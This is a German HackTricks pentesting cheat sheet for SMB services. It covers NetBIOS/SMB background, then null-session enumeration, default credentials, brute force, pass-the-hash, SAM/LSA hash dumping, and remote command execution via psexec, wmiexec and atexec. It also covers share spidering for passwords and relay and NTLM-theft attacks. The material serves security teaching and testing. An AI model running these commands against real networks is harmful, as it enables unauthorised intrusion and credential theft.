# 139,445 - Pentesting SMB

{{#include ../../banners/hacktricks-training.md}}

## **Port 139**

Das Network Basic Input Output System (NetBIOS) ist ein Softwareprotokoll, das Anwendungen, PCs und Desktops innerhalb eines Local Area Network (LAN) die Interaktion mit Netzwerkhardware ermöglicht und die Übertragung von Daten über das Netzwerk erleichtert. Die Identifikation und Lokalisierung von Softwareanwendungen, die in einem NetBIOS-Netzwerk betrieben werden, erfolgt über ihre NetBIOS names, die bis zu 16 Zeichen lang sein können und oft vom Computernamen abweichen. Eine NetBIOS session zwischen zwei Anwendungen wird initiiert, wenn eine Anwendung (als client agierend) einen Befehl sendet, um eine andere Anwendung (als server agierend) zu "call"en, wobei **TCP Port 139** verwendet wird.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## Port 445

Technisch wird Port 139 als ‘NBT over IP’ bezeichnet, während Port 445 als ‘SMB over IP’ geführt wird. Das Akronym **SMB** steht für ‘**Server Message Blocks**’, das heutzutage auch als **Common Internet File System (CIFS)** bekannt ist. Als Netzwerkprotokoll der Anwendungsschicht wird SMB/CIFS überwiegend verwendet, um gemeinsamen Zugriff auf Dateien, Drucker, serielle Schnittstellen zu ermöglichen und verschiedene Formen der Kommunikation zwischen Knoten in einem Netzwerk zu erleichtern.

Beispielsweise wird im Kontext von Windows darauf hingewiesen, dass SMB direkt über TCP/IP laufen kann und somit die Notwendigkeit für NetBIOS über TCP/IP entfällt, wenn Port 445 eingesetzt wird. Auf anderen Systemen hingegen wird Port 139 verwendet, was darauf hinweist, dass SMB zusammen mit NetBIOS über TCP/IP ausgeführt wird.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

Das **Server Message Block (SMB)**-Protokoll, das in einem **client-server**-Modell arbeitet, ist dafür ausgelegt, den **Zugriff auf Dateien**, Verzeichnisse und andere Netzwerkressourcen wie Drucker und Router zu regeln. Hauptsächlich innerhalb der **Windows**-Betriebssystemreihe verwendet, stellt SMB Abwärtskompatibilität sicher, sodass Geräte mit neueren Versionen von Microsofts Betriebssystem nahtlos mit solchen, die ältere Versionen ausführen, interagieren können. Zusätzlich bietet das **Samba**-Projekt eine freie Softwarelösung, die die Implementierung von SMB auf **Linux**- und Unix-Systemen ermöglicht und so plattformübergreifende Kommunikation über SMB erleichtert.

Shares, die **beliebige Teile des lokalen Dateisystems** repräsentieren, können von einem SMB-Server bereitgestellt werden, wodurch die Hierarchie für einen Client sichtbar wird, die teilweise **unabhängig** von der tatsächlichen Struktur des Servers ist. Die **Access Control Lists (ACLs)**, die die **Zugriffsrechte** definieren, ermöglichen eine **feingranulare Kontrolle** über Benutzerberechtigungen, einschließlich Attributen wie **`execute`**, **`read`** und **`full access`**. Diese Berechtigungen können basierend auf den Shares einzelnen Benutzern oder Gruppen zugewiesen werden und unterscheiden sich von den lokal auf dem Server gesetzten Berechtigungen.

### IPC$ Share

Der Zugriff auf die IPC$ share kann durch eine anonyme null session erlangt werden, wodurch eine Interaktion mit Diensten möglich ist, die über named pipes exponiert werden. Das Dienstprogramm `enum4linux` ist hierfür nützlich. Richtig eingesetzt ermöglicht es die Beschaffung von:

- Informationen zum Betriebssystem
- Details zur übergeordneten Domain
- Einer Aufstellung lokaler Benutzer und Gruppen
- Informationen zu verfügbaren SMB-Shares
- Der wirksamen System-Sicherheitsrichtlinie

Diese Funktionalität ist für Netzwerkadministratoren und Sicherheitsfachleute entscheidend, um die Sicherheitslage von SMB (Server Message Block)-Diensten in einem Netzwerk zu beurteilen. `enum4linux` bietet eine umfassende Ansicht der SMB-Umgebung des Zielsystems, die essenziell ist, um potenzielle Schwachstellen zu identifizieren und sicherzustellen, dass die SMB-Dienste ausreichend abgesichert sind.
```bash
enum4linux -a target_ip
```
Der obige Befehl ist ein Beispiel dafür, wie `enum4linux` verwendet werden könnte, um eine vollständige Enumeration gegen ein Ziel durchzuführen, das durch `target_ip` angegeben ist.

## Was ist NTLM

Wenn du nicht weißt, was NTLM ist, oder wissen möchtest, wie es funktioniert und wie man es missbrauchen kann, findest du diese Seite über **NTLM** sehr interessant, auf der erklärt wird, **wie dieses Protokoll funktioniert und wie du es zu deinem Vorteil nutzen kannst:**


{{#ref}}
../../windows-hardening/ntlm/
{{#endref}}

## **Server Enumeration**

### **Scan** ein Netzwerk nach Hosts:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB-Server-Version

Um nach möglichen Exploits für die SMB-Version zu suchen, ist es wichtig zu wissen, welche Version verwendet wird. Wenn diese Information in anderen verwendeten Tools nicht erscheint, kannst du:

- Verwende das **MSF** auxiliary module `**auxiliary/scanner/smb/smb_version**`
- Oder dieses script:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **Exploit suchen**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **Mögliche** Zugangsdaten

| **Benutzername(n)**  | **Häufige Passwörter**                    |
| -------------------- | ----------------------------------------- |
| _(leer)_             | _(leer)_                                  |
| guest                | _(blank)_                                 |
| Administrator, admin | _(blank)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada               |
| test, lab, demo      | password, test, lab, demo                 |

### Brute Force

- [**SMB Brute Force**](../../generic-hacking/brute-force.md#smb)

### SMB-Umgebungsinformationen

### Informationen beschaffen
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### Auflisten von Benutzern, Gruppen & angemeldeten Benutzern

Diese Informationen sollten bereits von enum4linux und enum4linux-ng gesammelt worden sein.
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### Lokale Benutzer auflisten

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
Einzeiler
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - Lokale Benutzer auflisten
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **Auflisten von LSARPC und SAMR mit rpcclient**


{{#ref}}
rpcclient-enumeration.md
{{#endref}}

### GUI-Verbindung unter linux

#### Im Terminal:

`xdg-open smb://cascade.htb/`

#### Im Dateimanagerfenster (nautilus, thunar, etc)

`smb://friendzone.htb/general/`

## Freigaben auflisten

### Freigaben auflisten

Es wird immer empfohlen zu prüfen, ob du auf etwas zugreifen kannst. Wenn du keine Credentials hast, versuche **null** **credentials/guest user** zu verwenden.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **Verbinden/Auflisten eines freigegebenen Ordners**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **Manuell Windows-Shares enumerieren und verbinden**

Es kann sein, dass Sie daran gehindert werden, Shares der Host-Maschine anzuzeigen, und wenn Sie versuchen, sie aufzulisten, sieht es so aus, als gäbe es keine Shares, zu denen Sie eine Verbindung herstellen können. Daher lohnt es sich, kurz zu versuchen, manuell eine Verbindung zu einem Share herzustellen. Um die Shares manuell zu enumerieren, sollten Sie auf Antworten wie NT_STATUS_ACCESS_DENIED und NT_STATUS_BAD_NETWORK_NAME achten, wenn Sie eine gültige Session verwenden (z. B. null session oder gültige Zugangsdaten). Diese können anzeigen, ob das Share existiert und Sie keinen Zugriff darauf haben oder ob das Share überhaupt nicht existiert.

Gängige Share-Namen für Windows-Targets sind

- C$
- D$
- ADMIN$
- IPC$
- PRINT$
- FAX$
- SYSVOL
- NETLOGON

(Gängige Share-Namen aus _**Network Security Assessment 3rd edition**_)

Sie können versuchen, sich mit ihnen zu verbinden, indem Sie den folgenden Befehl verwenden
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
oder dieses script (unter Verwendung einer null session)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
Beispiele
```bash
smbclient -U '%' -N \\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Freigaben unter Windows auflisten / ohne Drittanbieter-Tools**

PowerShell
```bash
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMD-Konsole
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC Snap-in (grafisch)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (grafisch), gib `\\<ip>\` ein, um die verfügbaren nicht ausgeblendeten Freigaben zu sehen.

### Freigegebenen Ordner einhängen
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **Dateien herunterladen**

Lesen Sie die vorherigen Abschnitte, um zu lernen, wie Sie sich mit credentials/Pass-the-Hash verbinden.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
Commands:

- mask: gibt die Maske an, mit der die Dateien im Verzeichnis gefiltert werden (z. B. "" für alle Dateien)
- recurse: schaltet Rekursion ein (Standard: aus)
- prompt: schaltet die Aufforderung zur Eingabe von Dateinamen aus (Standard: an)
- mget: kopiert alle Dateien, die der Maske entsprechen, vom Host auf die Client-Maschine

(_Information aus der manpage von smbclient_)

### Suche nach freigegebenen Ordnern in der Domain

- [**Snaffler**](https://github.com/SnaffCon/Snaffler)
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
- [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
- `-M spider_plus [--share <share_name>]`
- `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
Besonders interessant in Freigaben sind die Dateien mit dem Namen **`Registry.xml`**, da sie **Passwörter enthalten können** für Benutzer, die über **autologon** via Group Policy konfiguriert sind. Oder **`web.config`**-Dateien, da sie Anmeldeinformationen enthalten können.

> [!TIP]
> Die **SYSVOL share** ist für alle authentifizierten Benutzer in der Domain **lesbar**. Dort können Sie viele verschiedene batch-, VBScript- und PowerShell-**Skripte** finden.
> Sie sollten die **Skripte** darin **prüfen**, da Sie möglicherweise sensible Informationen wie **Passwörter** finden. Vertrauen Sie auch nicht auf automatisierte Share-Listings: Selbst wenn eine Share schreibgeschützt aussieht, können die zugrundeliegenden NTFS ACLs Schreibzugriff erlauben. Testen Sie immer mit smbclient, indem Sie eine kleine Datei zu `\\<dc>\\SYSVOL\\<domain>\\scripts\\` hochladen.
> If writable, you can [poison logon scripts for RCE at user logon](../../windows-hardening/active-directory-methodology/acl-persistence-abuse/README.md#sysvolnetlogon-logon-script-poisoning).

### ShareHound – OpenGraph collector for SMB shares (BloodHound)

[ShareHound](https://github.com/p0dalirius/sharehound) entdeckt Domain-SMB-Shares, durchläuft sie, extrahiert ACLs und erzeugt eine OpenGraph-JSON-Datei für BloodHound CE/Enterprise.

- Basis-Erfassung:
1) LDAP: Computer-Objekte auflisten, `dNSHostName` auslesen
2) DNS: Hosts auflösen
3) SMB: Shares auf erreichbaren Hosts auflisten
4) Shares crawlen (BFS/DFS), Dateien/Ordner auflisten, Berechtigungen erfassen

ShareQL-gesteuerte Traversierung
- [ShareQL](https://github.com/p0dalirius/shareql) ist eine first-match-wins DSL, um Traversierung nach host/share/path zu erlauben/verweigern und pro Regel die maximale Tiefe zu setzen. Konzentrieren Sie sich auf interessante Shares und begrenzen Sie die Rekursion.

Example ShareQL rules
```text
# Only crawl shares with name containing "backup", up to depth 2
allow host * share * path * depth 0
allow host * share *backup* path * depth 2
deny  host * share * path *
```
Verwendung
```bash
sharehound -ai "10.0.100.201" -au "user" -ap "Test123!" -ns "10.0.100.201" \
-rf "rules/skip_common_shares.shareql" -rf "rules/max_depth_2.shareql"
```
- Stelle AD creds über `-ad`/`-au`/`-ap` bereit (oder nutze `-ad` zusammen mit `-au`/`-ap`). Verwende `-r`/`-rf` für inline rules oder Dateien.
- Ausgabe: JSON OpenGraph; in BloodHound importieren, um hosts/shares/files und effective rights abzufragen.
- Tipp: Beschränke die max depth auf 1–2, es sei denn, deine Filter sind sehr restriktiv.

BloodHound Angriffsflächen-Abfragen
- Principals mit write-like access auf shares
```cypher
MATCH x=(p)-[r:CanWriteDacl|CanWriteOwner|CanDsWriteProperty|CanDsWriteExtendedProperties]->(s:NetworkShareSMB)
RETURN x
```
- Prinzipale mit FULL_CONTROL auf Freigaben
<details>
<summary>Cypher: Prinzipale mit FULL_CONTROL auf Freigaben</summary>
```cypher
MATCH (p:Principal)-[r]->(s:NetworkShareSMB)
WHERE (p)-[:CanDelete]->(s)
AND (p)-[:CanDsControlAccess]->(s)
AND (p)-[:CanDsCreateChild]->(s)
AND (p)-[:CanDsDeleteChild]->(s)
AND (p)-[:CanDsDeleteTree]->(s)
AND (p)-[:CanDsListContents]->(s)
AND (p)-[:CanDsListObject]->(s)
AND (p)-[:CanDsReadProperty]->(s)
AND (p)-[:CanDsWriteExtendedProperties]->(s)
AND (p)-[:CanDsWriteProperty]->(s)
AND (p)-[:CanReadControl]->(s)
AND (p)-[:CanWriteDacl]->(s)
AND (p)-[:CanWriteOwner]->(s)
RETURN p,r,s
```
</details>

- Hunt nach sensiblen Dateien anhand der Dateiendung (z. B. VMDKs)
```cypher
MATCH p=(h:NetworkShareHost)-[:HasNetworkShare]->(s:NetworkShareSMB)-[:Contains*0..]->(f:File)
WHERE toLower(f.extension) = toLower(".vmdk")
RETURN p
```
## Registry auslesen

Mit einigen entdeckten Anmeldeinformationen können Sie möglicherweise die **Registry auslesen**. Impacket **`reg.py`** ermöglicht Ihnen, Folgendes zu versuchen:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## Post Exploitation

Die **Standardkonfiguration** eines **Samba**-Servers befindet sich normalerweise in `/etc/samba/smb.conf` und kann einige **gefährliche Konfigurationen** enthalten:

| **Einstellung**             | **Beschreibung**                                                     |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Erlaubt das Auflisten verfügbarer Freigaben?                         |
| `read only = no`            | Verhindert das Erstellen und Ändern von Dateien?                     |
| `writable = yes`            | Ermöglicht Benutzern das Erstellen und Ändern von Dateien?           |
| `guest ok = yes`            | Erlaubt die Verbindung zum Dienst ohne Passwort?                     |
| `enable privileges = yes`   | Berücksichtigt Privilegien, die einer bestimmten SID zugewiesen sind?|
| `create mask = 0777`        | Welche Berechtigungen müssen neu erstellten Dateien zugewiesen werden? |
| `directory mask = 0777`     | Welche Berechtigungen müssen neu erstellten Verzeichnissen zugewiesen werden? |
| `logon script = script.sh`  | Welches Skript muss beim Login des Benutzers ausgeführt werden?      |
| `magic script = script.sh`  | Welches Skript soll ausgeführt werden, wenn das Script beendet wird? |
| `magic output = script.out` | Wo die Ausgabe des magic script gespeichert werden muss?            |

Der Befehl `smbstatus` liefert Informationen über den **Server** und darüber, **wer verbunden ist**.

## Authentifizierung mit Kerberos

Du kannst dich bei **Kerberos** mit den Tools **smbclient** und **rpcclient** authentifizieren:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
In Kerberos-only-Umgebungen (NTLM deaktiviert) können NTLM-Versuche gegen SMB `STATUS_NOT_SUPPORTED` zurückgeben. Behebe häufige Kerberos-Probleme und erzwinge Kerberos-Authentifizierung:
```bash
# sync clock to avoid KRB_AP_ERR_SKEW
sudo ntpdate <dc.fqdn>

# use Kerberos with tooling (reads your TGT from ccache)
netexec smb <dc.fqdn> -k
```
Für eine vollständige Client-Einrichtung (krb5.conf generation, kinit, SSH GSSAPI/SPN caveats) siehe:

{{#ref}}
../pentesting-kerberos-88/README.md
{{#endref}}

## **Befehle ausführen**

### **crackmapexec**

crackmapexec kann Befehle ausführen, indem es eines von **mmcexec, smbexec, atexec, wmiexec** ausnutzt; **wmiexec** ist die **default**-Methode. Mit dem Parameter `--exec-method` können Sie angeben, welche Option Sie verwenden möchten:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md)**/**[**smbexec**](../../windows-hardening/lateral-movement/smbexec.md)

Beide Optionen werden **einen neuen Dienst erstellen** (unter Verwendung von _\pipe\svcctl_ über SMB) auf der Zielmaschine und diesen verwenden, um **etwas auszuführen** (**psexec** wird eine ausführbare Datei auf das ADMIN$ share hochladen und **smbexec** wird auf **cmd.exe/powershell.exe** verweisen und das payload in die Argumente setzen --**file-less technique-**-).\
**Mehr Infos** zu [**psexec** ](../../windows-hardening/lateral-movement/psexec-and-winexec.md)and [**smbexec**](../../windows-hardening/lateral-movement/smbexec.md).\
In **kali** befindet es sich unter /usr/share/doc/python3-impacket/examples/
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
Mit dem **Parameter** `-k` kannst du dich gegenüber **kerberos** statt **NTLM** authentifizieren

### [wmiexec](../../windows-hardening/lateral-movement/wmiexec.md)/dcomexec

Führe unauffällig eine command shell aus, ohne die Festplatte zu berühren oder einen neuen Dienst zu starten, über DCOM via **port 135.**\
In **kali** befindet es sich unter /usr/share/doc/python3-impacket/examples/
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
Mit dem **Parameter** `-k` können Sie sich mit **kerberos** statt mit **NTLM** authentifizieren.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../../windows-hardening/lateral-movement/atexec.md)

Befehle über den Task Scheduler ausführen (unter Verwendung von _\pipe\atsvc_ über SMB).\
Unter **kali** befindet es sich unter /usr/share/doc/python3-impacket/examples/
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket-Referenz

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

### ksmbd Angriffsfläche und SMB2/SMB3-Protokoll-Fuzzing (syzkaller)

{{#ref}}
ksmbd-attack-surface-and-fuzzing-syzkaller.md
{{#endref}}

## **Bruteforce-Benutzer-Credentials**

**Dies wird nicht empfohlen — Sie könnten ein Konto sperren, wenn Sie die maximal erlaubten Versuche überschreiten**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB relay attack

Dieser Angriff verwendet das Responder toolkit, um **SMB authentication sessions** in einem internen Netzwerk zu erfassen und an eine **target machine** weiterzuleiten. Wenn die Authentifizierungs**session** erfolgreich ist, wird automatisch eine **system shell** geöffnet.\
[**More information about this attack here.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Die Windows-Bibliothek URLMon.dll versucht automatisch, sich beim Host zu authentifizieren, wenn eine Seite versucht, Inhalte via SMB zu laden, zum Beispiel: `img src="\\10.10.10.10\path\image.jpg"`

Das passiert mit den Funktionen:

- URLDownloadToFile
- URLDownloadToCache
- URLOpenStream
- URLOpenBlockingStream

Die von einigen Browsern und Tools (wie Skype) verwendet werden.

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../images/image (358).png>)

### SMBTrap using MitMf

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../images/image (892).png>)

## NTLM Theft

Ähnlich wie beim SMB Trapping kann das Platzieren bösartiger Dateien auf einem Zielsystem (zum Beispiel via SMB) eine SMB-Authentifizierungsanfrage auslösen, wodurch der NetNTLMv2-Hash mit einem Tool wie Responder abgefangen werden kann. Der Hash kann anschließend offline geknackt oder in einem [SMB relay attack](#smb-relay-attack) verwendet werden.

[See: ntlm_theft](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm_theft)

## HackTricks Automatic Commands
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
